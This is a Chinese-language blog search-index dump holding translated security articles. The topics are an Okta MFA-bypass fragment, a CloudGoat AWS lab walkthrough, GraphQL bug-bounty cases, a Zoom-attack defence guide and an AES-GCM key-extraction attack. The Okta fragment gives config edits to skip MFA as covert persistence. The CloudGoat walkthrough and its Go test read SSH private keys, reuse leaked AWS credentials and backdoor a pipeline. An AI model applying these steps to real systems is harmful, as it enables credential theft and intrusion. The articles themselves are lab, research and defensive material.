Provider\\config\\rdp_app_config.json\n修改两个关键参数：\n将InternetFailOpenOption值改为true 将Url值修改为无效地址 完成上述修改后，RDP连接将不再触发Okta MFA验证。\n注意事项\r虽然管理员权限可以直接卸载软件，但修改配置文件是最隐蔽的持久化方法。操作完成后可随时恢复原配置。\n","date":"2025-08-02T19:09:44+08:00","permalink":"http://localhost:1313/p/%E7%BB%95%E8%BF%87windows%E7%89%88okta%E5%A4%9A%E5%9B%A0%E7%B4%A0%E8%AE%A4%E8%AF%81%E5%87%AD%E8%AF%81%E6%8F%90%E4%BE%9B%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/","title":"绕过Windows版Okta多因素认证凭证提供程序的技术分析"},{"content":"直播内容概要\r主题：内存取证技术在网络安全与蓝队行动中的应用\n技术要点：\n内存取证基础原理与实战价值 使用工具分析内存转储中的恶意活动痕迹 蓝队视角下的入侵检测与响应技术 真实攻击案例中的内存取证流程演示 资源链接\r视频赞助：https://www.tcm.rocks/Sponsors 渗透测试服务：https://tcm-sec.com 培训课程：https://academy.tcm-sec.com 认证考试：https://certifications.tcm-sec.com 推荐技术书籍\r《渗透测试实战指南》 《黑客攻防技术宝典：Web实战篇》 《Python黑帽编程》 《Linux黑客基础教程》 ","date":"2025-08-02T18:58:56+08:00","permalink":"http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%AE%9E%E6%88%98-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%8E%E8%93%9D%E9%98%9F%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/","title":"内存取证实战 | 网络安全与蓝队技术解析"},{"content":"随着2022年网络安全意识月落幕，我由衷感谢这个自2004年设立的活动持续推动网络安全议题。虽然活动结束，但网络安全工作永无止境。网络安全常被视为复杂的技术问题，但其核心始终关乎人——我们保护的客户与社区、奋战在前线的网络安全专家，以及共同强化全球网络安全的整个社区。\n\u0026ldquo;当每个人都尽己所能时，攻击者就必须击败我们所有人才能击败其中一人。\u0026rdquo;\n——美国国家网络总监克里斯·英格利斯\n对客户的承诺体现在持续提升安全防护能力。微软安全响应中心（MSRC）每日创新防御技术，例如运用AI/ML提升事件响应效率。除技术革新外，我们还通过MSRC博客分享安全研究成果，并优化安全更新指南（SUG）通知系统，帮助客户管理风险。\n前线网络卫士是抵御攻击的中坚力量。MSRC团队全天候应对新兴威胁，但网络安全人才短缺加剧了挑战。微软正通过教育项目培养未来人才——技术固然重要，但人才是关键。\n协作的力量推动着安全标准的提升。我们与政府、学术界及安全社区建立深度合作，特别是通过漏洞赏金计划和研究者认可计划加强与安全研究者的联系。他们的贡献对全球客户防护至关重要。\n网络安全本质是人的事业，每个人都能为构建更安全的数字世界贡献力量。\n","date":"2025-08-02T18:42:53+08:00","permalink":"http://localhost:1313/p/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9A%84%E6%A0%B8%E5%BF%83%E5%9C%A8%E4%BA%8E%E4%BA%BA2022%E5%B9%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%84%8F%E8%AF%86%E6%9C%88%E5%9B%9E%E9%A1%BE/","title":"网络安全的核心在于人：2022年网络安全意识月回顾"},{"content":"Wild West Hackin\u0026rsquo; Fest (WWHF) SDR 实验室\r作者：David Fletcher //\n在WWHF会议期间，许多参会者索要软件定义无线电(SDR)实验的器材清单和源代码以便在家实践。由于需要根据会议期间的观察修改实验文档和代码，直到现在才完成整理。以下是完整的WWHF SDR实验资料，每个实验包含：器材清单、实验指南和实验脚本，下载全部三个文件即可开始实践。\n注：器材清单中的产品不代表官方推荐，仅为我们实际使用的设备。\n无线门铃攻击实验\r本实验演示对无线门铃信号的捕获、分析与合成，通过手动解码和重放攻击展示防重放机制的必要性。\n器材清单：\n(1) 无线门铃 - $16.99\n亚马逊链接 (1) RTL-SDR接收器 - $19.95\n亚马逊链接 (1) YardStick One发射器 - $123.95\n亚马逊链接 实验文件：\n实验手册 攻击脚本 Keeloq钥匙扣攻击实验\r本实验演示汽车钥匙滚动码信号的捕获与分析，揭示滚动码的保护机制及带外接收重放漏洞。\n器材清单：\n(1) 迷你面包板 - $5.69 (1) 面包板电源模块 - $5.49 (1) 面包板跳线 - $6.29 (1) 2.54mm单排排针 - $5.59 (2) PiStop交通信号灯 - $7.82 (1) Keeloq钥匙套件 - $21.95 (1) RTL-SDR接收器 - $19.95 (1) YardStick One发射器 - $123.95 实验文件：\n接线图 实验手册 解码脚本 想深入学习？Antisyphon提供可自主定价的进阶培训课程，支持直播/点播学习。\n","date":"2025-08-02T18:26:56+08:00","permalink":"http://localhost:1313/p/%E8%BD%AF%E4%BB%B6%E5%AE%9A%E4%B9%89%E6%97%A0%E7%BA%BF%E7%94%B5sdr%E6%94%BB%E9%98%B2%E5%AE%9E%E9%AA%8C%E6%97%A0%E7%BA%BF%E9%97%A8%E9%93%83%E4%B8%8Ekeeloq%E9%92%A5%E5%8C%99%E6%89%A3%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/","title":"软件定义无线电(SDR)攻防实验：无线门铃与Keeloq钥匙扣攻击实战"},{"content":"GraphQL与未授权数据访问漏洞\r0:19 章节探讨攻击者如何绕过权限控制获取敏感数据，包含HackerOne案例#343464分析\nGraphQL与未授权数据创建/修改漏洞\r2:15 演示通过GraphQL突变(Mutation)实现未授权数据操作的漏洞模式，引用HackerOne报告#2233480\nGraphQL与未授权数据删除漏洞\r3:27 分析危险的数据删除操作漏洞，涉及HackerOne案例#858671\nGraphQL如何导致DoS攻击\r6:11 解析复杂查询嵌套导致的服务器资源耗尽问题，引用LANDH技术博客2024年3月分析报告\nGraphQL中的SQL注入漏洞\r7:29 展示GraphQL参数如何传导至后端数据库，包含HackerOne案例#435066的注入技术细节\nGraphQL模式泄露是否算漏洞？\r10:09 讨论introspection查询暴露API结构的风险，分析敏感信息泄露场景\nGraphQL的CSRF攻击面\r11:28 讲解跨站请求伪造在GraphQL中的特殊表现形式，引用Doyensec安全研究报告\n获取完整案例研究 | 订阅邮件列表 | 关注Twitter\n关键资源链接已内嵌在时间轴章节中，包含DEF CON 32会议资料和GitHub OAuth CSRF绕过技术博客等专业参考内容。\n","date":"2025-08-02T18:15:58+08:00","permalink":"http://localhost:1313/p/graphql-api%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AE%9E%E6%88%98%E6%BC%8F%E6%B4%9E%E8%B5%8F%E9%87%91%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/","title":"GraphQL API漏洞挖掘实战：漏洞赏金案例分析"},{"content":"革命性命令行工具：Gemini CLI全面解析\r命令行界面（CLI）数十年来始终是开发者工作流的核心。如今随着软件开发复杂度激增，谷歌推出的Gemini CLI将多模态AI能力直接注入终端环境，为开发者带来智能化的全新体验。\nGemini技术架构\rGemini 1.5 Pro作为当前旗舰模型，具备以下技术特性：\n百万级上下文支持：可处理长达100万token的代码/文档 多模态处理：同步解析文本、代码、图像、PDF等格式 ReAct执行框架：通过\u0026quot;推理-执行\u0026quot;循环实现智能任务处理 核心功能矩阵\r功能模块 技术实现细节 典型应用场景 代码智能 跨文件代码分析/自动重构/异常诊断 复杂BUG追踪/测试用例生成 工作流自动化 集成Git/CI/CD工具链 部署流水线优化/日志监控 多模态交互 OCR识别/图像转代码/文档摘要 设计稿转前端代码/报告速读 上下文感知 @file指令实时读取项目文件 精准代码建议/文档生成 开发者技术栈集成\r1 2 3 4 5 # 安装部署（需Node.js≥18环境） npm install -g @google/gemini-cli gemini # API密钥配置（提升调用限额） export GEMINI_API_KEY=\u0026#34;your_actual_key\u0026#34; 技术优势对比\r零成本入门：每日1000次免费请求额度 本地化处理：支持敏感代码的离线分析 可扩展架构：通过Model Context Protocol集成自定义工具 典型技术场景\r1 2 # 示例：自动分析Python性能瓶颈 gemini \u0026#34;分析当前目录下*.py文件的CPU密集型函数，建议优化方案\u0026#34; 技术资源\rGitHub仓库 模型协议文档 性能白皮书 该工具标志着命令行界面进入AI-Native时代，其代码理解深度和系统级操作能力正在重塑开发范式。\n","date":"2025-08-02T17:54:46+08:00","permalink":"http://localhost:1313/p/%E8%B0%B7%E6%AD%8Cgemini-cli%E5%BC%80%E5%8F%91%E8%80%85%E5%85%8D%E8%B4%B9ai%E5%B7%A5%E5%85%B7%E7%9A%84%E9%9D%A9%E5%91%BD%E6%80%A7%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%BD%93%E9%AA%8C/","title":"谷歌Gemini CLI：开发者免费AI工具的革命性命令行体验"},{"content":"Trail of Bits的反编译技术栈\rTrail of Bits正在开发多个与程序反编译相关的开源项目：Remill、Anvill、Rellic以及新推出的Magnifier。其技术策略是通过多级中间表示（IR）逐步提升编译程序：\nRemill：将机器指令转换为LLVM IR Anvill：把机器码函数转化为LLVM函数 Rellic：通过Clang AST将LLVM IR转换为C代码 Magnifier创新性地实现了在任意管道阶段进行交互式转换，研究人员可以实时操作Anvill的LLVM IR并查看Rellic生成的C代码。\n从REPL起步的原型\rMagnifier最初作为命令行REPL（读取-求值-输出循环）开发，支持以下核心转换操作：\n使用LLVM优化函数 函数内联 带/不带常量折叠的值替换 函数指针去虚拟化 关键技术实现包括：\n唯一标识系统：为所有函数、参数、基本块和IR指令分配不透明ID 指令溯源机制：通过\u0026quot;当前ID|源ID\u0026quot;的双重标识追踪转换过程 通用替换接口：允许用户监控、允许或拒绝每个替换步骤 可视化界面MagnifierUI\r基于Vue.js前端和C++后端的MagnifierUI具有以下特性：\n多会话WebSocket通信架构 并列显示LLVM IR与Rellic生成的C代码 支持指令级高亮关联 集成优化按钮调用LLVM全套优化 典型工作流示例：\n上传二进制文件 在终端视图执行参数值替换 实时观察IR和C代码同步更新 通过内联按钮优化函数调用 LLVM优化的实战演示\r通过\u0026quot;fibIter(100)\u0026ldquo;案例展示Magnifier的威力：\n内联fibIter函数调用 执行LLVM优化 直接获得结果值3314859971（第100个斐波那契数） 该过程避免了动态调试的复杂性，展示了如何将含循环/条件语句的复杂函数简化为常量。\n未来发展方向\r项目规划包括：\n扩展转换类型支持（最终实现完整补丁集） 集成Anvill直接解析二进制文件 增强可视化界面的交互功能 Magnifier通过创新的交互式反编译方法，正在重新定义逆向工程的研究范式。\n","date":"2025-08-02T17:43:34+08:00","permalink":"http://localhost:1313/p/magnifier%E4%BA%A4%E4%BA%92%E5%BC%8F%E5%8F%8D%E7%BC%96%E8%AF%91%E7%9A%84%E5%AE%9E%E9%AA%8C%E6%80%A7%E5%B7%A5%E5%85%B7/","title":"Magnifier：交互式反编译的实验性工具"},{"content":"构建易受攻击的AWS DevOps环境作为CloudGoat场景\r我是可丢弃安全实验室的忠实粉丝，无论是用于攻击还是防御目的（参见：在Azure中自动化配置Active Directory实验室）。在撰写《云安全漏洞与破坏：2021年回顾》之后，我想构建一个\u0026quot;故意设计为易受攻击的AWS实验室\u0026quot;，包含典型的攻击路径，包括静态、长期有效的凭证和供应链安全元素。\nCloudGoat：易受攻击的AWS环境\rCloudGoat是一个开源项目，包含一系列易受攻击的AWS环境，可以使用Python封装的Terraform在您自己的AWS账户中轻松创建。每个场景都有一个专用文件夹，包含其描述和解决方案。\n示例CloudGoat场景\r例如，您可以使用以下命令在AWS账户中启动cicd场景：\n1 python cloudgoat.py create cicd 此命令将运行Terraform来启动基础设施，并显示开始使用的说明。通常，它会输出一组AWS凭证作为起点。\n贡献新的CloudGoat场景\r直接链接：https://github.com/RhinoSecurityLabs/cloudgoat/tree/master/scenarios/cicd\n场景故事\rFooCorp是一家提供公共API的公司。FooCorp的客户每分钟都会向以下API端点提交敏感数据：\n1 2 3 4 5 POST {apiUrl}/prod/hello Host: {apiHost} Content-Type: text/html superSecretData=... 该API实现为一个Lambda函数，通过API Gateway公开。由于FooCorp实施了DevOps，它有一个持续部署管道，可以在几分钟内自动将Lambda函数的新版本从源代码部署到生产环境。\n您的任务（如果您选择接受）：您将获得一个初始的低权限IAM用户的AWS凭证集。您的目标是窃取提交给FooCorp API的敏感数据。请注意，模拟用户活动正在账户中进行，模拟对FooCorp API的活动。这是通过每分钟运行的AWS CodeBuild项目实现的。\n该场景包含：\n3个IAM用户 1个VPC，其中包含一个位于私有子网中的EC2实例 用于实现API的组件： 1个API Gateway 1个Lambda函数 1个ECR仓库 用于实现持续部署管道的组件： 1个CodePipeline管道 2个CodeBuild项目 1个CodeCommit仓库 FooCorp基础设施架构图\r漏洞利用步骤\r本节包含剧透！只有当您卡住了，或者不打算挑战该场景时才应阅读。点击此处跳过本节继续阅读：使用端到端测试进行持续测试\n当我们通过python3 cloudgoat.py create cicd实例化场景时，会获得一个初始的AWS IAM访问密钥：\n1 2 3 4 5 6 7 [cloudgoat] terraform apply completed with no error code. [cloudgoat] terraform output completed with no error code. cloudgoat_output_access_key_id = AKIA254BBSG... cloudgoat_output_api_url = https://4ybsnrwee1.execute-api.us-east-1.amazonaws.com/prod cloudgoat_output_aws_account_id = 012345678912 cloudgoat_output_secret_access_key = mjV9uB.... 我们可以设置AWS_ACCESS_KEY_ID和AWS_SECRET_ACCESS_KEY环境变量，或使用aws-vault。我更喜欢后者，因为它可以方便地同时使用CLI和AWS控制台。\n1 2 3 4 5 6 7 8 9 10 $ aws-vault add cloudgoat-step1 Enter Access Key ID: Enter Secret Access Key: Added credentials to profile \u0026#34;cloudgoat-step1\u0026#34; in vault # 使用CLI $ aws-vault exec cloudgoat-step1 --no-session # 打开AWS控制台 $ aws-vault login cloudgoat-step1 --no-session 我们以名为ec2-sandbox-manager的用户身份进行身份验证，该用户有一个IAM策略，允许我们管理标记为Environment=dev的EC2实例的标签，并对标记为Environment=sandbox的实例执行任何SSM操作。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 { \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Resource\u0026#34;: \u0026#34;*\u0026#34;, \u0026#34;Action\u0026#34;: [ \u0026#34;ec2:CreateTags\u0026#34;, \u0026#34;ec2:DeleteTags\u0026#34; ], \u0026#34;Condition\u0026#34;: { \u0026#34;StringLike\u0026#34;: { \u0026#34;ec2:ResourceTag/Environment\u0026#34;: [\u0026#34;dev\u0026#34;] } } }, { \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Resource\u0026#34;: \u0026#34;*\u0026#34;, \u0026#34;Action\u0026#34;: [\u0026#34;ssm:*\u0026#34;], \u0026#34;Condition\u0026#34;: { \u0026#34;StringLike\u0026#34;: { \u0026#34;ssm:ResourceTag/Environment\u0026#34;: [\u0026#34;sandbox\u0026#34;] } } } 有一个EC2实例正在运行，标记为Environment=dev：\n我们的IAM策略不允许我们通过AWS SSM Session Manager访问该实例。但是，我们确实有权限覆盖用于访问控制的Environment标签：\n然后我们可以访问EC2实例：\n1 2 3 4 5 $ aws ssm start-session --region us-east-1 --target i-030c2cba2ef533829 Starting session with SessionId: ec2-sandbox-manager-06e2440aa9ed6f315 # id uid=1001(ssm-user) gid=1001(ssm-user) groups=1001(ssm-user) 在用户的主目录下，我们找到一个SSH私钥：\n1 2 3 4 5 $ cd $ cat .ssh/id_rsa -----BEGIN RSA PRIVATE KEY----- MIIEpAIBAAKCAQEApn/Tcy ... 通过将其指纹与账户中其他IAM用户关联的SSH公钥进行比较，我们注意到被盗的私钥属于名为cloner的IAM用户：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 $ ssh-keygen -f .ssh/stolen_key -l -E md5 2048 MD5:be:5e:49:5e:e5:d0:66:bb:91:30:3f:66:2e:97:1a:11 $ aws iam list-ssh-public-keys --user-name cloner { \u0026#34;SSHPublicKeys\u0026#34;: [ { \u0026#34;UserName\u0026#34;: \u0026#34;cloner\u0026#34;, \u0026#34;SSHPublicKeyId\u0026#34;: \u0026#34;APKA254BBSGPK2B5K5YQ\u0026#34;, \u0026#34;Status\u0026#34;: \u0026#34;Active\u0026#34;, \u0026#34;UploadDate\u0026#34;: \u0026#34;2021-12-27T10:34:19+00:00\u0026#34; } ] } $ aws iam get-ssh-public-key --user-name cloner --ssh-public-key-id APKA254BBSGPK2B5K5YQ --encoding PEM --output text --query \u0026#39;SSHPublicKey.Fingerprint\u0026#39; be:5e:49:5e:e5:d0:66:bb:91:30:3f:66 该用户恰好拥有对CodeCommit仓库的codecommit:GitPull权限。使用CodeCommit文档，我们可以将仓库克隆到本地机器：\n1 2 3 4 5 6 7 8 9 10 chmod 700 .ssh/stolen_key export AWS_REGION=us-east-1 sshKeyId=$(aws iam list-ssh-public-keys --user-name cloner --output text --query \u0026#39;SSHPublicKeys[0].SSHPublicKeyId\u0026#39;) cat \u0026gt;\u0026gt; .ssh/config \u0026lt;\u0026lt;EOF Host *.amazonaws.com IdentityFile ~/.ssh/stolen_key EOF git clone ssh://$sshKeyId@git-codecommit.$AWS_REGION.amazonaws.com/v1/repos/backend-api 现在我们有了应用程序的源代码！\n源代码中没有什么有趣的内容。然而，如果我们查看Git提交历史，有一个提交引起了我们的注意：\n1 2 3 4 5 39ac1aa (HEAD -\u0026gt; master, origin/master, origin/HEAD) Added app.py 88055fb Added requirements.txt bdf59bb Added Dockerfile f1cb341 Use built-in AWS authentication instead of hardcoded keys 70f0181 Added buildspec.yml 分析这个提交的差异（git show f1cb341）揭示了一些泄露的AWS凭证！\n使用这些凭证验证AWS时，我们注意到我们刚刚攻陷了IAM用户developer的凭证，该用户拥有codecommit:GitPush和codecommit:PutFile权限。\n我们现在可以使用CodeCommit UI来后门应用程序，并等待持续部署管道将其部署到生产环境！例如，我们可以让应用程序将秘密数据记录到其日志（CloudWatch日志组/aws/lambda/backend-api）中。我们也可以后门应用程序，让它在每个请求上将秘密数据发送到远程、攻击者控制的服务器——或者不修改应用程序代码，而是后门Docker镜像本身。\n一旦我们执行了恶意提交，CodePipeline管道就会获取我们的更改并开始将其推出到生产环境：\n几分钟后，我们成功地后门了应用程序并捕获了标志！\n1 2 3 START RequestId: 3bd6cd1e-9e01-4012-859d-70c9fcd9d643 Version: $LATEST superSecretData=FLAG{SupplyCh4!nS3curityM4tt3r5\u0026#34;} END RequestId: 3bd6cd1e-9e01-4012-859d-70c9fcd9d643 使用端到端测试进行持续测试\r如前所述，该场景基于Terraform代码，负责创建VPC、EC2实例、管道等。Terraform代码并不简单。我们如何高度自信地认为它持续按预期工作？回想一下，在我们的上下文中，\u0026ldquo;工作\u0026quot;意味着处于可以通过预期步骤利用的状态。\n我们利用了Terratest，这是一个用于测试Terraform代码的Go库。更具体地说，我们编写了如下工作的Go测试：\n使用Terratest运行我们的Terraform代码，针对实时AWS环境。资源实际部署到AWS。 从我们的Go测试中，向FooCorp API发送实际的HTTP请求，以确保它已正确部署。 仍然从我们的Go测试中，以编程方式执行漏洞利用步骤，一步一步来。 测试完成后，销毁我们通过Terraform代码配置的基础设施。 然后我们可以使用go test运行我们的测试，可以手动运行，也可以在每次拉取请求时自动运行。以下是\u0026quot;以代码形式存在的漏洞利用步骤\u0026quot;的样子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 func (test *EndToEndTest) StealPrivateSSHKey(instanceId string) string { // 在实例上执行SSM命令以窃取SSH私钥 ssmClient := ssm.NewFromConfig(test.awsConfig) result, err := ssmClient.SendCommand(context.TODO(), \u0026amp;ssm.SendCommandInput{ DocumentName: aws.String(\u0026#34;AWS-RunShellScript\u0026#34;), InstanceIds: []string{instanceId}, Parameters: map[string][]string{ \u0026#34;commands\u0026#34;: {\u0026#34;cat /home/ssm-user/.ssh/id_rsa\u0026#34;}, }, }) test.assert.Nil(err, \u0026#34;Unable to send SSM command to instance\u0026#34;) // 等待SSM命令的输出 commandOutput, err := ssm.NewCommandExecutedWaiter(ssmClient).WaitForOutput(context.TODO(), \u0026amp;ssm.GetCommandInvocationInput{ CommandId: result.Command.CommandId, InstanceId: \u0026amp;instanceId, }, 2*time.Minute) test.assert.Nil(err, \u0026#34;failed to retrieve SSM command output\u0026#34;) // 我们成功窃取了SSH私钥 return *commandOutput.StandardOutputContent } 1 2 3 --- PASS: TestScenario (248.47s) PASS ok github.com/cloudgoat/tests/supply-chain-security\t249.070s 结论\r我鼓励您尝试这个场景！更广泛地说，CloudGoat有一组有价值的实验室，包含许多现实世界的AWS漏洞。\n您对这个场景有什么看法？您如何测试您的安全实验室？您希望在CloudGoat中看到什么？让我们在Twitter上继续讨论！\n感谢RhinoSecurityLabs的Ryan Gerstenkorn提供的出色贡献体验！感谢您的阅读。\n","date":"2025-08-02T17:27:26+08:00","permalink":"http://localhost:1313/p/%E6%9E%84%E5%BB%BA%E6%98%93%E5%8F%97%E6%94%BB%E5%87%BB%E7%9A%84aws-devops%E7%8E%AF%E5%A2%83%E4%BD%9C%E4%B8%BAcloudgoat%E5%9C%BA%E6%99%AF/","title":"构建易受攻击的AWS DevOps环境作为CloudGoat场景"},{"content":"防范ELUSIVE COMET Zoom远程控制攻击的技术实践\r我们的遭遇经历\r当我们的CEO收到参加\u0026quot;Bloomberg Crypto\u0026quot;节目的邀请时，他立即识别出这是精心设计的社会工程攻击。攻击者通过两个Twitter账号联系，拒绝使用电子邮件沟通，并引导至非官方的Calendly页面进行日程安排。\n新发现的攻击指标(IoCs)\r新增与ELUSIVE COMET攻击基础设施关联的账户：\nX: @KOanhHa X: @EditorStacy 邮箱: bloombergconferences[@]gmail.com Zoom会议链接: https://us06web[.]zoom[.]us/j/84525670750 Zoom远程控制功能解析\r攻击者利用Zoom合法的远程控制功能：\n安排看似正常的商务会议 在屏幕共享时请求远程控制权限 将显示名改为\u0026quot;Zoom\u0026quot;伪装系统通知 获得权限后安装恶意软件或窃取数据 攻击成功的关键因素\r合法业务场景掩护 权限对话框未明确安全风险 用户习惯性点击\u0026quot;同意\u0026quot; 受害者注意力集中在业务对话 深度防御技术方案\r终端防护配置\rCrowdStrike Falcon Complete启用24/7威胁狩猎 采用\u0026quot;Active\u0026quot;安全策略和云端ML防护 实时检测可疑进程行为 系统级防护措施\r1 2 3 create_zoom_pppc_profile.bash # 创建系统级PPPC配置文件 disable_zoom_accessibility.bash # 每15分钟检查移除Zoom权限 uninstall_zoom.bash # 每周彻底卸载Zoom PPPC配置核心优势\r系统级禁用Zoom辅助功能权限 适用于所有用户账户 通过代码签名精准定位官方Zoom应用 用户无法通过常规方式覆盖 TCC数据库动态监控\r每15分钟扫描并重置已有权限 生成安全日志用于攻击检测 允许临时授权后自动清理 彻底移除方案\r完全卸载Zoom客户端 清除所有残留组件和缓存 强制使用浏览器参会 扩展安全建议\r建立媒体采访标准化流程 部署Material Security等邮件安全工具 配置DMARC/SPF/DKIM邮件防护 创建无责安全报告文化 构建弹性防御体系\r通过组合技术控制(PPPC配置、TCC监控、应用卸载)与操作安全意识，组织可有效防御此类人机交互攻击。对于处理加密货币等敏感业务的环境，建议完全禁用Zoom远程控制功能。\n","date":"2025-08-02T17:15:04+08:00","permalink":"http://localhost:1313/p/%E9%98%B2%E8%8C%83elusive-comet-zoom%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E6%94%BB%E5%87%BB%E7%9A%84%E6%8A%80%E6%9C%AF%E5%AE%9E%E8%B7%B5/","title":"防范ELUSIVE COMET Zoom远程控制攻击的技术实践"},{"content":"翻转比特的踪迹\r可信执行环境(TEE)如安全飞地(secure enclave)正日益普及，用于保护云中的资产。它们的承诺很诱人：当飞地被正确使用时，即使是飞地的操作者或云服务提供商也无法访问这些资产。然而，这导致了一个强大的攻击者模型，与飞地交互的实体可能就是攻击者。在这篇博客中，我们将探讨一种涉及AES-GCM、ECDSA和Shamir秘密共享算法的加密技术在这种环境下可能失败的方式——具体来说，通过对AES-GCM使用Forbidden攻击来翻转私钥分片的比特位，我们可以迭代恢复私钥。\n可信飞地\rTEE有多种形式和大小。它们可以使用单独的硬件安全模块(HSM)、可信平台模块(TPM)或作为片上系统(SoC)一部分的其他专用安全芯片来实现。也可以使用内存隔离技术(如TrustZone或虚拟机监控程序)在与不可信实体共享的硬件中实现，这类例子包括Intel SGX、Amazon Nitro等安全飞地。\n安全飞地面临的一个挑战是它们几乎没有持久内存，因此需要在断电周期后仍然可用的大量数据必须存储在飞地外部。为了保持这些数据的安全，必须使用存储在可信环境内部或外部密钥管理服务(KMS)中的存储密钥进行加密，KMS通过某种形式的认证限制对飞地的访问。\n然而，由于数据存储在外部，与飞地交互的不可信实体会看到这些数据并可能修改它。即使使用强加密技术如带有关联数据的认证加密(AEAD)，飞地也很难保护自己免受回滚攻击，即不可信实体用相同数据的早期版本替换外部数据，因为两者都会通过认证。一个诱人的解决方案是对存储在飞地外部的数据进行版本控制，但由于飞地是无状态的，不知道最新版本应该是什么，这很快变成了一个先有鸡还是先有蛋的问题。因此，在这种情况下跟踪版本号或使用计数器是困难的，甚至是不可能的。\n在可信飞地中签名\r可信飞地的一个有趣应用是保存数字签名私钥(如ECDSA密钥)以执行签名。如果设置正确，没有人可以从飞地中窃取签名密钥。然而，由于签名密钥必须在飞地断电后仍然可用，它们通常必须以某种形式持久存储在外部存储中。为了防止任何有权访问此外部存储的人获取或修改签名密钥，需要使用AEAD对其进行加密。\n于是我们迎来了大家最爱的AEAD：AES-GCM！由于其脆弱的设计，一旦使用相同的nonce加密两个不同的签名密钥，认证保证就会被不可逆转地破坏。由于AES块大小限制为128位，并且需要32位用于计数器，你只有96位用于nonce。不过别担心，你只需要确保不要使用随机nonce调用AES-GCM超过2^32次！所以飞地只需要跟踪一个使用计数器。唉，正如前面所说，这基本上是不可能的。\n因此，攻击者可以让飞地生成任意数量的签名密钥，所有这些密钥都必须加密以存储在外部。最终，nonce会重复，攻击者可以使用Forbidden攻击恢复AES-GCM哈希密钥。细节并不十分重要，但本质上，有了AES-GCM哈希密钥，攻击者可以获取任何现有的AES-GCM密文和标签，以某种方式修改密文，并使用哈希密钥更新标签。具体来说，他们可以翻转密文中的比特位，当飞地解密时，将导致原始明文除了相同的比特位被翻转。这很不好。但有多糟糕呢？\n攻击ECDSA签名\r这种攻击并非ECDSA特有，因此不需要理解ECDSA背后的所有具体数学知识。理解攻击所需的唯一重要背景是了解ECDSA密钥对是如何构造的。私钥对应一个数字(也称为标量)d。要获得相应的公钥Q，私钥乘以你想要使用的特定椭圆曲线的基点G。\n1 Q = d · G 通过利用被破坏的AES-GCM认证，攻击者可以翻转加密私钥中的比特位，并让飞地解密并使用它来签名消息。由于AES-GCM的加密部分本质上是计数器模式，翻转加密私钥中的比特位将导致相应明文私钥中的相同比特位翻转。\n当我们翻转私钥的最低有效位时会发生什么？零位会变成一，这相当于给私钥加一。相反，一位会变成零，这相当于给私钥减一。本质上，比特翻转对私钥的影响取决于私钥位的未知值。\n这很好，但我们如何在不了解私钥的情况下知道这两种情况中哪一种发生了呢？好吧，如果我们用翻转后的私钥生成签名，我们可以通过添加或减去生成器来使用修改后的公钥验证签名。如果它用添加的生成器验证，我们知道私钥位是零，而如果它用减去的生成器验证，我们知道私钥位是一。\n1 2 (d + 1) · G = d · G + G = Q + G (d – 1) · G = d · G – G = Q – G 我们现在可以重复这个过程来恢复私钥的其他位。我们将不再加或减一，而是加或减二的幂到私钥。通过从公钥加或减生成器的相应倍数，我们了解私钥的一个新位。严格来说，不需要一次恢复一位。你可以翻转多个位，并根据这些翻转位对私钥可能产生的所有影响尝试签名验证。\n分割比特\r有趣的是，当私钥在加密前使用Shamir的秘密共享算法分割成不同的分片时，攻击仍然有效。飞地接收不同的加密分片，解密它们，将分片重新组合成私钥，然后签名。因此，我们不能直接翻转私钥中的单个位。\n但是当我们翻转其中一个分片中的位时会发生什么？在Shamir的秘密共享中(另见我们关于此主题的优秀ZKDocs文章)，每个分片由一对x和y值组成，用于使用拉格朗日插值法插值多项式。秘密值由插值多项式在x = 0处的值给出。\n翻转其中一个y值中的位会改变插值多项式，对应于一个不同的秘密——在我们的例子中是私钥。基本上，重新组合秘密对应于加权y值的总和，其中每个权重是一个拉格朗日系数λj，可以很容易地从x坐标计算出来(x坐标通常选择为从1开始到分片数量的连续整数)。\n将所有这些放在一起，翻转其中一个分片中的位会根据位的值向分片添加或减去。然后这导致向私钥添加或减去相应的拉格朗日系数λj的倍数。通过用这个修改后的私钥生成签名并使用修改后的公钥验证它们，我们可以逐位恢复秘密分片的值。获得分片后，我们可以将它们重新组合成私钥。总之，这表明飞地操作者可以从飞地中提取私钥，尽管涉及了所有的密码学和隔离。\n最后一位\r正如对安全飞地中AES-GCM的Forbidden攻击的探索所揭示的，像AES-GCM、ECDSA和Shamir的秘密共享这样的加密原语，虽然通常很强大，但如果部署不正确，仍然可能容易受到攻击。TEE的复杂性和对抗方法的不断发展使得保护敏感数据成为一项艰巨的任务。在Trail of Bits，我们理解这些挑战。利用我们在密码学和应用安全方面的深厚专业知识，我们提供全面的系统审计，识别潜在漏洞并提供有效的缓解策略。通过与我们合作，开发人员可以更好地避免潜在的加密陷阱，并提高其TEE的整体安全状况。\n1 